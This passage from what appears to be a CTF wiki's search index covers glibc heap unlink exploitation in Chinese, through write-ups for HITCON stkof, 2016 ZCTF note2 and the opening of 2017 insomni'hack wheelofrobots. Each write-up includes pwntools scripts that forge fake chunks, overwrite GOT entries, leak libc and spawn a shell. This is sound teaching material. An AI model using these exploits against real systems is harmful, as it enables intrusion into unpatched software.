in order to trigger unlink \n     alloc ( 0x80 )    # idx 3 \n     # a fake chunk at global[2]=head+16 who s size is 0x20 \n     payload   =   p64 ( 0 )    #prev_size \n     payload   +=   p64 ( 0x20 )    #size \n     payload   +=   p64 ( head   +   16   -   0x18 )    #fd \n     payload   +=   p64 ( head   +   16   -   0x10 )    #bk \n     payload   +=   p64 ( 0x20 )    # next chunk s prev_size bypass the check \n     payload   =   payload . ljust ( 0x30 ,   a ) \n     # overwrite global[3] s chunk s prev_size \n     # make it believe that prev chunk is at global[2] \n     payload   +=   p64 ( 0x30 ) \n     # make it believe that prev chunk is free \n     payload   +=   p64 ( 0x90 ) \n     edit ( 2 ,   len ( payload ),   payload ) \n     # unlink fake chunk, so global[2] = (global[2])-0x18=head-8 \n     free ( 3 ) \n     p . recvuntil ( OK \\n ) \n     #gdb.attach(p) \n     # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got \n     payload   =   a   *   8   +   p64 ( stkof . got [ free ])   +   p64 ( stkof . got [ puts ])   +   p64 ( \n         stkof . got [ atoi ]) \n     edit ( 2 ,   len ( payload ),   payload ) \n     # edit free@got to puts@plt \n     payload   =   p64 ( stkof . plt [ puts ]) \n     edit ( 0 ,   len ( payload ),   payload ) \n\n     #free global[1] to leak puts addr \n     free ( 1 ) \n     puts_addr   =   p . recvuntil ( \\n OK \\n ,   drop = True ) . ljust ( 8 ,   \\x00 ) \n     puts_addr   =   u64 ( puts_addr ) \n     log . success ( puts addr:    +   hex ( puts_addr )) \n     libc_base   =   puts_addr   -   libc . symbols [ puts ] \n     binsh_addr   =   libc_base   +   next ( libc . search ( /bin/sh )) \n     system_addr   =   libc_base   +   libc . symbols [ system ] \n     log . success ( libc base:    +   hex ( libc_base )) \n     log . success ( /bin/sh addr:    +   hex ( binsh_addr )) \n     log . success ( system addr:    +   hex ( system_addr )) \n     # modify atoi@got to system addr \n     payload   =   p64 ( system_addr ) \n     edit ( 2 ,   len ( payload ),   payload ) \n     p . send ( p64 ( binsh_addr )) \n     p . interactive ()  if   __name__   ==   __main__ : \n     exp ()", 
            "title": "\u57fa\u672c\u601d\u8def"
        }, 
        {
            "location": "/pwn/heap/unlink/#2016-zctf-note2", 
            "text": "", 
            "title": "2016 ZCTF note2"
        }, 
        {
            "location": "/pwn/heap/unlink/#_6", 
            "text": "\u9996\u5148\uff0c\u6211\u4eec\u5148\u5206\u6790\u4e00\u4e0b\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u7684\u4e3b\u8981\u529f\u80fd\u4e3a   \u6dfb\u52a0note\uff0csize\u9650\u5236\u4e3a0x80\uff0csize\u4f1a\u88ab\u8bb0\u5f55\uff0cnote\u6307\u9488\u4f1a\u88ab\u8bb0\u5f55\u3002  \u5c55\u793anote\u5185\u5bb9\u3002  \u7f16\u8f91note\u5185\u5bb9\uff0c\u5176\u4e2d\u5305\u62ec\u8986\u76d6\u5df2\u6709\u7684note\uff0c\u5728\u5df2\u6709\u7684note\u540e\u9762\u6dfb\u52a0\u5185\u5bb9\u3002  \u91ca\u653enote\u3002   \u4ed4\u7ec6\u5206\u6790\u540e\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u6709\u4ee5\u4e0b\u51e0\u4e2a\u95ee\u9898   \u5728\u6dfb\u52a0note\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u8bb0\u5f55note\u5bf9\u5e94\u7684\u5927\u5c0f\uff0c\u8be5\u5927\u5c0f\u4f1a\u7528\u4e8e\u63a7\u5236\u8bfb\u53d6note\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u8bfb\u53d6\u7684\u5faa\u73af\u53d8\u91cfi\u662f\u65e0\u7b26\u53f7\u53d8\u91cf\uff0c\u6240\u4ee5\u6bd4\u8f83\u65f6\u90fd\u4f1a\u8f6c\u6362\u4e3a\u65e0\u7b26\u53f7\u53d8\u91cf\uff0c\u90a3\u4e48\u5f53\u6211\u4eec\u8f93\u5165size\u4e3a0\u65f6\uff0cglibc\u6839\u636e\u5176\u89c4\u5b9a\uff0c\u4f1a\u5206\u914d0x20\u4e2a\u5b57\u8282\uff0c\u4f46\u662f\u7a0b\u5e8f\u8bfb\u53d6\u7684\u5185\u5bb9\u5374\u5e76\u4e0d\u53d7\u5230\u9650\u5236\uff0c\u6545\u800c\u4f1a\u4ea7\u751f\u5806\u6ea2\u51fa\u3002  \u7a0b\u5e8f\u5728\u6bcf\u6b21\u7f16\u8f91note\u65f6\uff0c\u90fd\u4f1a\u7533\u8bf70xa0\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u4f46\u662f\u5728 free \u4e4b\u540e\u5e76\u6ca1\u6709\u8bbe\u7f6e\u4e3aNULL\u3002   \u7b2c\u4e00\u4e2a\u95ee\u9898\u5bf9\u5e94\u5728ida\u4e2d\u7684\u4ee3\u7801\u5982\u4e0b  unsigned   __int64   __fastcall   ReadLenChar ( __int64   a1 ,   __int64   a2 ,   char   a3 )  { \n   char   v4 ;   // [sp+Ch] [bp-34h]@1 \n   char   buf ;   // [sp+2Fh] [bp-11h]@2 \n   unsigned   __int64   i ;   // [sp+30h] [bp-10h]@1 \n   __int64   v7 ;   // [sp+38h] [bp-8h]@2 \n\n   v4   =   a3 ; \n   for   (   i   =   0LL ;   a2   -   1     i ;   ++ i   ) \n   { \n     v7   =   read ( 0 ,   buf ,   1uLL ); \n     if   (   v7   =   0   ) \n       exit ( - 1 ); \n     if   (   buf   ==   v4   ) \n       break ; \n     * ( _BYTE   * )( i   +   a1 )   =   buf ; \n   } \n   * ( _BYTE   * )( a1   +   i )   =   0 ; \n   return   i ;  }   \u5176\u4e2di\u662funsigned\u7c7b\u578b\uff0ca2\u4e3aint\u7c7b\u578b\uff0c\u6240\u4ee5\u4e24\u8005\u5728for\u5faa\u73af\u76f8\u6bd4\u8f83\u7684\u65f6\u5019\uff0ca2-1\u7684\u7ed3\u679c-1\u4f1a\u88ab\u89c6\u4e3aunsigned\u7c7b\u578b\uff0c\u6b64\u65f6\uff0c\u5373\u6700\u5927\u7684\u6574\u6570\u3002\u6240\u4ee5\u8bf4\u53ef\u4ee5\u8bfb\u53d6\u4efb\u610f\u957f\u5ea6\u7684\u6570\u636e\uff0c\u8fd9\u91cc\u4e5f\u5c31\u662f\u540e\u9762\u6211\u4eec\u6ea2\u51fa\u6240\u4f7f\u7528\u7684\u529e\u6cd5\u3002", 
            "title": "\u5206\u6790\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/heap/unlink/#_7", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u5229\u7528\u53d1\u73b0\u7684\u7b2c\u4e00\u4e2a\u95ee\u9898\uff0c\u4e3b\u8981\u5229\u7528\u4e86 fastbin \u7684\u673a\u5236\u3001unlink \u7684\u673a\u5236\u3002  \u4e0b\u9762\u4f9d\u6b21\u8fdb\u884c\u8bb2\u89e3\u3002", 
            "title": "\u57fa\u672c\u601d\u8def"
        }, 
        {
            "location": "/pwn/heap/unlink/#_8", 
            "text": "\u9996\u5148\uff0c\u6211\u4eec\u5148\u628anote\u53ef\u80fd\u7684\u57fa\u672c\u64cd\u4f5c\u5217\u4e3e\u51fa\u6765\u3002  p   =   process ( ./note2 )  note2   =   ELF ( ./note2 )  libc   =   ELF ( /lib/x86_64-linux-gnu/libc.so.6 )  context . log_level   =   debug  def   newnote ( length ,   content ): \n     p . recvuntil ( option--- ) \n     p . sendline ( 1 ) \n     p . recvuntil ( (less than 128) ) \n     p . sendline ( str ( length )) \n     p . recvuntil ( content: ) \n     p . sendline ( content )  def   shownote ( id ): \n     p . recvuntil ( option--- ) \n     p . sendline ( 2 ) \n     p . recvuntil ( note: ) \n     p . sendline ( str ( id ))  def   editnote ( id ,   choice ,   s ): \n     p . recvuntil ( option--- ) \n     p . sendline ( 3 ) \n     p . recvuntil ( note: ) \n     p . sendline ( str ( id )) \n     p . recvuntil ( 2.append] ) \n     p . sendline ( str ( choice )) \n     p . sendline ( s )  def   deletenote ( id ): \n     p . recvuntil ( option--- ) \n     p . sendline ( 4 ) \n     p . recvuntil ( note: ) \n     p . sendline ( str ( id ))", 
            "title": "\u57fa\u672c\u64cd\u4f5c"
        }, 
        {
            "location": "/pwn/heap/unlink/#note", 
            "text": "\u8fd9\u4e00\u90e8\u5206\u5bf9\u5e94\u7684\u4ee3\u7801\u5982\u4e0b  # chunk0: a fake chunk  ptr   =   0x0000000000602120  fakefd   =   ptr   -   0x18  fakebk   =   ptr   -   0x10  content   =   a   *   8   +   p64 ( 0x61 )   +   p64 ( fakefd )   +   p64 ( fakebk )   +   b   *   64   +   p64 ( 0x60 )  #content = p64(fakefd) + p64(fakebk)  newnote ( 128 ,   content )  # chunk1: a zero size chunk produce overwrite  newnote ( 0 ,   a   *   8 )  # chunk2: a chunk to be overwrited and freed  newnote ( 0x80 ,   b   *   16 )   \u5176\u4e2d\u8fd9\u4e09\u4e2anote\u7684\u5927\u5c0f\u5206\u522b\u4e3a0x80\uff0c0\uff0c0x80\uff0c\u7b2c\u4e8c\u4e2achunk\u867d\u7136\u7533\u8bf7\u7684\u5927\u5c0f\u4e3a0\uff0c\u4f46\u662fglibc\u7684\u8981\u6c42chunk\u5757\u81f3\u5c11\u53ef\u4ee5\u5b58\u50a84\u4e2a\u5fc5\u8981\u7684\u5b57\u6bb5(prev_size,size,fd,bk)\uff0c\u6240\u4ee5\u4f1a\u5206\u914d0x20\u7684\u7a7a\u95f4\u3002\u540c\u65f6\uff0c\u7531\u4e8e\u65e0\u7b26\u53f7\u6574\u6570\u7684\u6bd4\u8f83\u95ee\u9898\uff0c\u53ef\u4ee5\u4e3a\u8be5note\u8f93\u5165\u4efb\u610f\u957f\u7684\u5b57\u7b26\u4e32\u3002  \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cchunk1\u4e2d\u4e00\u5171\u6784\u9020\u4e86\u4e24\u4e2achunk   chunk ptr[0]\uff0c\u8fd9\u4e2a\u662f\u4e3a\u4e86unlink\u65f6\u4fee\u6539\u5bf9\u5e94\u7684\u503c\u3002  chunk ptr[0]'s nextchunk\uff0c\u8fd9\u4e2a\u662f\u4e3a\u4e86\u4f7f\u5f97unlink\u65f6\u7684\u7b2c\u4e00\u4e2a\u68c0\u67e5\u6ee1\u8db3\u3002        // \u7531\u4e8eP\u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002 \n     if   ( __builtin_expect   ( chunksize ( P )   !=   prev_size   ( next_chunk ( P )),   0 ))       \\\n       malloc_printerr   ( corrupted size vs. prev_size );                \\  \u5f53\u6784\u9020\u5b8c\u4e09\u4e2a note \u540e\uff0c\u5806\u7684\u57fa\u672c\u6784\u9020\u5982\u56fe1\u6240\u793a\u3002                                     +-----------------+ high addr\n                                   |      ...        |\n                                   +-----------------+\n                                   |       b *8      |\n                ptr[2]-----------  +-----------------+\n                                   |    size=0x91    |\n                                   +-----------------+\n                                   |    prevsize     |\n                                   +-----------------+------------\n                                   |    unused       |\n                                   +-----------------+\n                                   |     a *8        |\n                 ptr[1]----------  +-----------------+  chunk 1\n                                   |    size=0x20    |\n                                   +-----------------+\n                                   |    prevsize     |\n                                   +-----------------+-------------\n                                   |    unused       |\n                                   +-----------------+\n                                   |  prev_size=0x60 |\nfake ptr[0] chunk s nextchunk----- +-----------------+\n                                   |    64* a        |\n                                   +-----------------+\n                                   |    fakebk       |\n                                   +-----------------+\n                                   |    fakefd       |\n                                   +-----------------+\n                                   |    0x61         |  chunk 0\n                                   +-----------------+\n                                   |     a *8        |\n                 ptr[0]----------  +-----------------+\n                                   |    size=0x91    |\n                                   +-----------------+\n                                   |    prev_size    |\n                                   +-----------------+  low addr\n                                           \u56fe1", 
            "title": "\u751f\u6210\u4e09\u4e2anote"
        }, 
        {
            "location": "/pwn/heap/unlink/#chunk1-chunk2-chunk2", 
            "text": "\u5bf9\u5e94\u7684\u4ee3\u7801\u5982\u4e0b  # edit the chunk1 to overwrite the chunk2  deletenote ( 1 )  content   =   a   *   16   +   p64 ( 0xa0 )   +   p64 ( 0x90 )  newnote ( 0 ,   content )  # delete note 2 to trigger the unlink  # after unlink, ptr[0] = ptr - 0x18  deletenote ( 2 )   \u9996\u5148\u91ca\u653e chunk1\uff0c\u7531\u4e8e\u8be5chunk\u5c5e\u4e8efastbin\uff0c\u6240\u4ee5\u4e0b\u6b21\u5728\u7533\u8bf7\u7684\u65f6\u5019\u4ecd\u7136\u4f1a\u7533\u8bf7\u5230\u8be5chunk\uff0c\u540c\u65f6\u7531\u4e8e\u4e0a\u9762\u6240\u8bf4\u7684\u7c7b\u578b\u95ee\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u8bfb\u53d6\u4efb\u610f\u5b57\u7b26\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u8986\u76d6chunk3\uff0c\u8986\u76d6\u4e4b\u540e\u5982\u56fe2\u6240\u793a\u3002                                     +-----------------+high addr\n                                   |      ...        |\n                                   +-----------------+\n                                   |    \\x00 + b *7  |\n                ptr[2]-----------  +-----------------+ chunk 2\n                                   |    size=0x90    |\n                                   +-----------------+\n                                   |    0xa0         |\n                                   +-----------------+------------\n                                   |     a *8        |\n                                   +-----------------+\n                                   |     a *8        |\n                 ptr[1]----------  +-----------------+ chunk 1\n                                   |    size=0x20    |\n                                   +-----------------+\n                                   |    prevsize     |\n                                   +-----------------+-------------\n                                   |    unused       |\n                                   +-----------------+\n                                   |  prev_size=0x60 |\nfake ptr[0] chunk s nextchunk----- +-----------------+\n                                   |    64* a        |\n                                   +-----------------+\n                                   |    fakebk       |\n                                   +-----------------+\n                                   |    fakefd       |\n                                   +-----------------+\n                                   |    0x61         |  chunk 0\n                                   +-----------------+\n                                   |     a *8        |\n                 ptr[0]----------  +-----------------+\n                                   |    size=0x91    |\n                                   +-----------------+\n                                   |    prev_size    |\n                                   +-----------------+  low addr\n                                           \u56fe2  \u8be5\u8986\u76d6\u4e3b\u8981\u662f\u4e3a\u4e86\u91ca\u653echunk2\u7684\u65f6\u5019\u53ef\u4ee5\u540e\u5411\u5408\u5e76\uff08\u5408\u5e76\u4f4e\u5730\u5740\uff09\uff0c\u5bf9chunk0\u4e2d\u865a\u62df\u6784\u9020\u7684chunk\u8fdb\u884cunlink\u3002\u5373\u5c06\u8981\u6267\u884c\u7684\u64cd\u4f5c\u4e3aunlink(ptr[0])\uff0c\u540c\u65f6\u6211\u4eec\u6240\u6784\u9020\u7684fakebk\u548cfakefd\u6ee1\u8db3\u5982\u4e0b\u7ea6\u675f       if   ( __builtin_expect   ( FD - bk   !=   P   ||   BK - fd   !=   P ,   0 ))                       \\  unlink\u6210\u529f\u6267\u884c\uff0c\u4f1a\u5bfc\u81f4ptr[0]\u6240\u5b58\u50a8\u7684\u5730\u5740\u53d8\u4e3afakebk\uff0c\u5373ptr-0x18\u3002", 
            "title": "\u91ca\u653echunk1-\u8986\u76d6chunk2-\u91ca\u653echunk2"
        }, 
        {
            "location": "/pwn/heap/unlink/#system", 
            "text": "\u4ee3\u7801\u5982\u4e0b  # overwrite the chunk0(which is ptr[0]) with got atoi  atoi_got   =   note2 . got [ atoi ]  content   =   a   *   0x18   +   p64 ( atoi_got )  editnote ( 0 ,   1 ,   content )  # get the aoti addr  shownote ( 0 )  sh . recvuntil ( is  )  atoi_addr   =   sh . recvuntil ( \\n ,   drop = True )  print   atoi_addr  atoi_addr   =   u64 ( atoi_addr . ljust ( 8 ,   \\x00 ))  print   leak atoi addr:    +   hex ( atoi_addr )  # get system addr  atoi_offest   =   libc . symbols [ atoi ]  libcbase   =   atoi_addr   -   atoi_offest  system_offest   =   libc . symbols [ system ]  system_addr   =   libcbase   +   system_offest  print   leak system addr:  ,   hex ( system_addr )   \u6211\u4eec\u4fee\u6539ptr[0]\u7684\u5185\u5bb9\u4e3a ptr \u7684\u5730\u5740-0x18\uff0c\u6240\u4ee5\u5f53\u6211\u4eec\u518d\u6b21\u7f16\u8f91 note0 \u65f6\uff0c\u53ef\u4ee5\u8986\u76d6ptr[0]\u7684\u5185\u5bb9\u3002\u8fd9\u91cc\u6211\u4eec\u5c06\u5176\u8986\u76d6\u4e3aatoi\u7684\u5730\u5740\u3002\n\u8fd9\u6837\u7684\u8bdd\uff0c\u5982\u679c\u6211\u4eec\u67e5\u770bnote 0\u7684\u5185\u5bb9\uff0c\u5176\u5b9e\u67e5\u770b\u7684\u5c31\u662fatoi\u7684\u5730\u5740\u3002  \u4e4b\u540e\u6211\u4eec\u6839\u636e libc \u4e2d\u5bf9\u5e94\u7684\u504f\u79fb\u8ba1\u7b97\u51fa system \u7684\u5730\u5740\u3002", 
            "title": "\u83b7\u53d6system\u5730\u5740"
        }, 
        {
            "location": "/pwn/heap/unlink/#atoi-got", 
            "text": "# overwrite the atoi got with systemaddr  content   =   p64 ( system_addr )  editnote ( 0 ,   1 ,   content )   \u7531\u4e8e\u6b64\u65f6 ptr[0] \u7684\u5730\u5740 got \u8868\u7684\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u8be5 note\uff0c\u8986\u76d6\u4e3a system \u5730\u5740\u3002", 
            "title": "\u4fee\u6539atoi got"
        }, 
        {
            "location": "/pwn/heap/unlink/#get-shell", 
            "text": "# get shell  sh . recvuntil ( option--- )  sh . sendline ( /bin/sh )  sh . interactive ()   \u6b64\u65f6\u5982\u679c\u6211\u4eec\u518d\u8c03\u7528 atoi \uff0c\u5176\u5b9e\u8c03\u7528\u7684\u5c31\u662f system \u51fd\u6570\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u62ff\u5230shell\u4e86\u3002", 
            "title": "get shell"
        }, 
        {
            "location": "/pwn/heap/unlink/#2017-insomnihack-wheelofrobots", 
            "text": "", 
            "title": "2017 insomni'hack wheelofrobots"
        }, 
        {
            "location": "/pwn/heap/unlink/#_9", 
            "text": "\u279c  2017_insomni hack_wheelofrobots git:(master) file wheelofrobots   wheelofrobots: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=48a9cceeb7cf8874bc05ccf7a4657427fa4e2d78, stripped  \u279c  2017_insomni hack_wheelofrobots git: ( master )  checksec wheelofrobots  [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unlink/2017_insomni hack_wheelofrobots/wheelofrobots \n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 )   \u52a8\u6001\u94fe\u63a564\u4f4d\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 canary \u4fdd\u62a4\u4e0e nx \u4fdd\u62a4\u3002", 
            "title": "\u57fa\u672c\u4fe1\u606f"
        }, 
        {
            "location": "/pwn/heap/unlink/#_10", 
            "text": "\u5927\u6982\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5f97\u77e5\uff0c\u8fd9\u662f\u4e00\u4e2a\u914d\u7f6e\u673a\u5668\u4eba\u8f6e\u5b50\u7684\u6e38\u620f\uff0c\u673a\u5668\u4eba\u4e00\u5171\u9700\u8981\u6dfb\u52a0 3 \u4e2a\u8f6e\u5b50\u3002  \u7a0b\u5e8f\u975e\u5e38\u4f9d\u8d56\u7684\u4e00\u4e2a\u529f\u80fd\u662f\u8bfb\u53d6\u6574\u6570\uff0c\u8be5\u51fd\u6570read_num\u662f\u8bfb\u53d6\u6307\u5b9a\u7684\u957f\u5ea6\uff0c\u5c06\u5176\u8f6c\u5316\u4e3a int \u7c7b\u578b\u7684\u6570\u5b57\u3002  \u5177\u4f53\u529f\u80fd\u5982\u4e0b   \u6dfb\u52a0\u8f6e\u5b50\uff0c\u4e00\u5171\u6709 6 \u4e2a\u8f6e\u5b50\u53ef\u4ee5\u9009\u62e9\u3002\u9009\u62e9\u8f6e\u5b50\u65f6\u4f7f\u7528\u51fd\u6570\u662fread_num\uff0c\u7136\u800c\u8be5\u51fd\u6570\u5728\u8bfb\u53d6\u7684\u65f6\u5019 read_num((char *) choice, 5uLL);  \u8bfb\u53d6\u7684\u957f\u5ea6\u662f 5 \u4e2a\u5b57\u8282\uff0c\u6070\u597d\u8986\u76d6\u4e86 bender_inuse \u7684\u6700\u4f4e\u5b57\u8282\uff0c\u5373\u6784\u6210\u4e86 off-by-one \u6f0f\u6d1e\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u5728\u6dfb\u52a0 Destructor \u8f6e\u5b50\u7684\u65f6\u5019\uff0c\u5e76\u6ca1\u6709\u8fdb\u884c\u5927\u5c0f\u68c0\u6d4b\u3002\u5982\u679c\u8bfb\u53d6\u7684\u6570\u4e3a\u8d1f\u6570\uff0c\u90a3\u4e48\u5728\u7533\u8bf7 calloc(1uLL, 20 * v5);  \u65f6\u5c31\u53ef\u80fd\u5bfc\u81f4  20*v5  \u6ea2\u51fa\uff0c\u4f46\u4e0e\u6b64\u540c\u65f6\uff0c  destructor_size = v5   \u4ecd\u7136\u4f1a\u5f88\u5927\u3002  \u79fb\u9664\u8f6e\u5b50\uff0c\u76f4\u63a5\u5c06\u76f8\u5e94\u8f6e\u5b50\u79fb\u9664\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u5c06\u5176\u5bf9\u5e94\u7684\u6307\u9488\u8bbe\u7f6e\u4e3a NULL \uff0c\u5176\u5bf9\u5e94\u7684\u5927\u5c0f\u4e5f\u6ca1\u6709\u6e05\u7a7a\u3002  \u4fee\u6539\u8f6e\u5b50\u540d\u5b57\uff0c\u8fd9\u4e2a\u662f\u6839\u636e\u5f53\u65f6\u7533\u8bf7\u7684\u8f6e\u5b50\u7684\u5927\u5c0f\u7a7a\u95f4\u6765\u8bfb\u53d6\u6570\u636e\u3002\u4e4b\u524d\u6211\u4eec\u5df2\u7ecf\u8bf4\u8fc7 destructor \u8f6e\u5b50\u8bfb\u53d6\u5927\u5c0f\u65f6\uff0c\u5e76\u6ca1\u6709\u68c0\u6d4b\u8d1f\u6570\u7684\u60c5\u51b5\uff0c\u6240\u4ee5\u5728\u8fdb\u884c\u5982\u4e0b\u64cd\u4f5c\u65f6  result = read(0, destructor, 20 * destructor_size);  \uff0c\u5b58\u5728\u51e0\u4e4e\u4efb\u610f\u957f\u5ea6\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002  \u542f\u52a8\u673a\u5668\u4eba\uff0c\u5728\u542f\u52a8\u7684\u65f6\u5019\u4f1a\u968f\u673a\u5730\u8f93\u51fa\u4e00\u4e9b\u8f6e\u5b50\u7684\u540d\u79f0\uff0c\u8fd9\u4e2a\u662f\u6211\u4eec\u96be\u4ee5\u63a7\u5236\u7684\u3002   \u7efc\u4e0a\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff0c\u8be5\u7a0b\u5e8f\u4e3b\u8981\u5b58\u5728\u7684\u6f0f\u6d1e off-by-one \u4e0e\u6574\u6570\u6ea2\u51fa\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4f7f\u7528\u524d\u9762\u7684off-by-one \u6f0f\u6d1e\u3002", 
            "title": "\u57fa\u672c\u529f\u80fd"
        }, 
        {
            "location": "/pwn/heap/unlink/#_11", 
            "text": "\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b   \u5229\u7528 off by one \u6f0f\u6d1e\u4e0e fastbin attack \u5206\u914d chunk \u5230 0x603138\uff0c\u8fdb\u800c\u53ef\u4ee5\u63a7\u5236  destructor_size \u7684\u5927\u5c0f\uff0c\u4ece\u800c\u5b9e\u73b0\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u3002\u8fd9\u91cc\u6211\u4eec\u5c06\u8f6e\u5b501 tinny \u5206\u914d\u5230\u8fd9\u91cc\u3002  \u5206\u522b\u5206\u914d\u5408\u9002\u5927\u5c0f\u7684\u7269\u7406\u76f8\u90bb\u7684 chunk\uff0c\u5176\u4e2d\u5305\u62ec destructor\u3002\u501f\u52a9\u4e0a\u9762\u53ef\u4ee5\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\uff0c\u5bf9 destructor \u5bf9\u5e94\u7684 chunk \u8fdb\u884c\u6ea2\u51fa\uff0c\u5c06\u5176\u6ea2\u51fa\u5230\u4e0b\u4e00\u4e2a\u7269\u7406\u76f8\u90bb\u7684 chunk\uff0c\u4ece\u800c\u5b9e\u73b0\u5bf9 0x6030E8 \u5904 fake chunk \u8fdb\u884c unlink \u7684\u6548\u679c\uff0c\u8fd9\u65f6 bss \u6bb5\u7684 destructor \u6307\u5411 0x6030D0\u3002\u4ece\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u518d\u6b21\u5b9e\u73b0\u8986\u76d6bss \u6bb5\u51e0\u4e4e\u6240\u6709\u7684\u5185\u5bb9\u3002  \u6784\u9020\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u7684\u6f0f\u6d1e\u3002\u901a\u8fc7\u4e0a\u8ff0\u7684\u6f0f\u6d1e\u5c06\u5df2\u7ecf\u5206\u914d\u7684\u8f6e\u5b501 tinny \u6307\u9488\u8986\u76d6\u4e3a destructor \u7684\u5730\u5740\uff0c\u90a3\u4e48\u6b64\u540e\u7f16\u8f91 tinny \u5373\u5728\u7f16\u8f91 destructor \u7684\u5185\u5bb9\uff0c\u8fdb\u800c\u5f53\u6211\u4eec\u518d\u6b21\u7f16\u8f91 destructor \u65f6\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u4f4e\u5730\u5740\u5199\u3002  \u7531\u4e8e\u7a0b\u5e8f\u53ea\u662f\u5728\u6700\u540e\u542f\u52a8\u673a\u5668\u4eba\u7684\u65f6\u5019\uff0c\u624d\u4f1a\u968f\u673a\u8f93\u51fa\u4e00\u4e9b\u8f6e\u5b50\u7684\u5185\u5bb9\uff0c\u5e76\u4e14\u4e00\u65e6\u8f93\u51fa\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u9000\u51fa\uff0c\u7531\u4e8e\u8fd9\u90e8\u5206\u6211\u4eec\u5e76\u4e0d\u80fd\u63a7\u5236\uff0c\u6240\u4ee5\u6211\u4eec\u5c06  exit()  patch \u4e3a\u4e00\u4e2a  ret  \u5730\u5740\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u591a\u6b21\u8f93\u51fa\u5185\u5bb9\u4e86\uff0c\u4ece\u800c\u53ef\u4ee5\u6cc4\u6f0f\u4e00\u4e9b got \u8868\u5730\u5740\u3002 \u5176\u5b9e\uff0c\u65e2\u7136\u6211\u4eec\u6709\u4e86\u4efb\u610f\u5730\u5740\u5199\u7684\u6f0f\u6d1e\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c06\u67d0\u4e2a got \u5199\u4e3a puts \u7684 plt \u5730\u5740\uff0c\u8fdb\u800c\u8c03\u7528\u76f8\u5e94\u51fd\u6570\u65f6\u4fbf\u53ef\u4ee5\u76f4\u63a5\u5c06\u76f8\u5e94\u5185\u5bb9\u8f93\u51fa\u3002\u4f46\u662f\u8fd9\u91cc\u5e76\u4e0d\u53bb\u91c7\u7528\u8fd9\u79cd\u65b9\u6cd5\uff0c\u56e0\u4e3a\u4e4b\u524d\u5df2\u7ecf\u5728 hitcon stkof \u4e2d\u7528\u8fc7\u8fd9\u79cd\u624b\u6cd5\u4e86\u3002  \u5728\u6cc4\u6f0f\u4e86\u76f8\u5e94\u7684\u5185\u5bb9\u540e\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230 libc \u57fa\u5730\u5740\uff0csystem \u5730\u5740\uff0clibc\u4e2d\u7684 /bin/sh \u5730\u5740\u3002\u8fdb\u800c\u6211\u4eec\u4fee\u6539 free@got \u4e3a system \u5730\u5740\u3002\u4ece\u800c\u5f53\u518d\u6b21\u91ca\u653e\u67d0\u5757\u5185\u5b58\u65f6\uff0c\u4fbf\u53ef\u4ee5\u542f\u52a8shell\u3002   \u4ee3\u7801\u5982\u4e0b  from   pwn   import   *  context . terminal   =   [ gnome-terminal ,   -x ,   sh ,   -c ]  if   args [ DEBUG ]: \n     context . log_level   =   debug  context . binary   =   ./wheelofrobots  robots   =   ELF ( ./wheelofrobots )  if   args [ REMOTE ]: \n     p   =   remote ( 127.0.0.1 ,   7777 )  else : \n     p   =   process ( ./wheelofrobots )  log . info ( PID:    +   str ( proc . pidof ( p )[ 0 ]))  libc   =   ELF ( ./libc.so.6 )  def   offset_bin_main_arena ( idx ): \n     word_bytes   =   context . word_size   /   8 \n     offset   =   4    # lock \n     offset   +=   4    # flags \n     offset   +=   word_bytes   *   10    # offset fastbin \n     offset   +=   word_bytes   *   2    # top,last_remainder \n     offset   +=   idx   *   2   *   word_bytes    # idx \n     offset   -=   word_bytes   *   2    # bin overlap \n     return   offset  def   add ( idx ,   size = 0 ): \n     p . recvuntil ( Your choice : ) \n     p . sendline ( 1 ) \n     p . recvuntil ( Your choice : ) \n     p . sendline ( str ( idx )) \n     if   idx   ==   2 : \n         p . recvuntil ( Increase Bender s intelligence:  ) \n         p . sendline ( str ( size )) \n     elif   idx   ==   3 : \n         p . recvuntil ( Increase Robot Devil s cruelty:  ) \n         p . sendline ( str ( size )) \n     elif 